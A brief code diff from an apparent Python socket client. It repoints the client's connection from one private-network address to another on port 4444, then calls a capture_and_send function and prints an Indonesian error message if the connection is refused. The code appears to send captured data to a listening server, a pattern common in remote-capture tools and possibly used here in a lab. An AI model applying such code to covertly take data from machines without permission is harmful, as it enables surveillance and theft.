@@ -27,7 +27,7 @@ def capture_and_send(sock):
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-    sock.connect(('192.168.1.3', 4444))
+    sock.connect(('192.168.91.245', 4444))
     capture_and_send(sock)
 except ConnectionRefusedError:
     print("Koneksi ditolak. Pastikan server telah dijalankan.")
